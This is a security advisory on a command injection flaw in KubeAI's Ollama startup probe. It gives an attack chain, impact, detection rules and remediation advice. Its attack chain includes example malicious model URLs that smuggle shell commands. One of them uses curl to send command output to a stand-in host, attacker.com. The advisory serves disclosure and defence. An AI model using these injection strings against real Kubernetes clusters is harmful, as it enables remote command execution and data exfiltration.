---
title: KubeAI OS Command Injection via Model URL in Ollama Engine Startup Probe
slug: 2026-04-kubeai-command-injection
description: The KubeAI project is vulnerable to OS command injection because the `ollamaStartupProbeScript()` function constructs a shell command string using `fmt.Sprintf` with unsanitized model URL components (`ref`, `modelParam`), which is then executed via `bash -c` as a Kubernetes startup probe, allowing arbitrary command execution inside model server pods by attackers with the ability to create or update `Model` custom resources.
date: "2026-04-01T23:22:43Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - kubeai
  - command-injection
  - kubernetes
  - cloud
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
references:
  - https://github.com/advisories/GHSA-324q-cwx9-7crr
rules:
  - title: Detect KubeAI Model Resource Command Injection
    description: Detects potentially malicious Model resources with command injection attempts in the URL field.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - auditd
      - kubernetes
  - title: Detect Outbound Connections from KubeAI Pods after Model Creation
    description: Detects outbound connections from KubeAI pods immediately after a new model is deployed, which could indicate data exfiltration.
    platform: sigma
    severity: medium
    tactics:
      - exfiltration
    techniques:
      - T1041
    data_sources:
      - network_connection
      - linux
rules_count: 2
---

KubeAI versions 0.23.1 and earlier are vulnerable to an OS command injection flaw in the Ollama engine's startup probe. The vulnerability stems from the `ollamaStartupProbeScript()` function, which constructs a shell command using `fmt.Sprintf` with unsanitized model URL components (`ref` and `modelParam`). These components are extracted from the Model custom resource URL. An attacker who can create or update `Model` custom resources can inject arbitrary shell commands, which are then executed within the model server pods. This occurs because the extracted URL components are not sanitized before being interpolated into a shell command executed by `bash -c`. Successful exploitation allows attackers to compromise the model serving infrastructure and potentially access sensitive information or execute commands on the underlying host.

## Attack Chain

1. An attacker gains the ability to create or update `Model` custom resources in a KubeAI environment. This could be through compromised credentials, misconfigured RBAC permissions, or other vulnerabilities.
2. The attacker crafts a malicious `Model` custom resource with a specially crafted URL in the `spec.url` field. The URL contains shell metacharacters and commands within the `ref` component or the `model` query parameter. For example, `ollama://registry.example.com/model;id>/tmp/pwned;echo` or `pvc://my-pvc?model=qwen2:0.5b;curl${IFS}http://attacker.com/$(whoami);echo`.
3. The attacker applies the malicious `Model` resource to the Kubernetes cluster, triggering the KubeAI model controller.
4. The `parseModelURL()` function parses the malicious URL and extracts the unsanitized `ref` and `modelParam` components.
5. The `ollamaStartupProbeScript()` function constructs a shell command string using `fmt.Sprintf` with the unsanitized `ref` and `modelParam` components. The resulting command is intended to pull or copy the specified model.
6. The KubeAI model controller creates a pod for the model server, configuring a startup probe that executes the crafted shell command via `bash -c`.
7. The Kubernetes kubelet executes the startup probe, running the attacker-injected shell commands within the pod's context.
8. The attacker achieves arbitrary command execution inside the model server pod, potentially leading to data exfiltration, lateral movement, or compromise of the model serving infrastructure.

## Impact

Successful exploitation of this vulnerability allows for arbitrary command execution within KubeAI model server pods. This can lead to several severe consequences: data exfiltration from the pod's environment (environment variables, mounted secrets, service account tokens), lateral movement to other cluster resources in multi-tenant environments, and compromise of the model serving infrastructure. An attacker with Model creation permissions can execute arbitrary commands in model pods, potentially accessing sensitive data. The vulnerability affects KubeAI installations version 0.23.1 and earlier.

## Recommendation

*   Upgrade KubeAI to a version beyond 0.23.1 that includes the fix for CVE-2026-34940.
*   Implement strict RBAC policies to limit who can create or update `Model` custom resources.
*   Deploy the Sigma rule "Detect KubeAI Model Resource Command Injection" to identify malicious `Model` resources being created or updated.
*   Monitor Kubernetes audit logs for suspicious activity related to `Model` custom resource creation and updates.
*   If upgrading is not immediately feasible, consider implementing a Kubernetes admission webhook that validates and sanitizes the `spec.url` field of `Model` custom resources, allowing only alphanumeric characters, slashes, colons, dots, and hyphens.
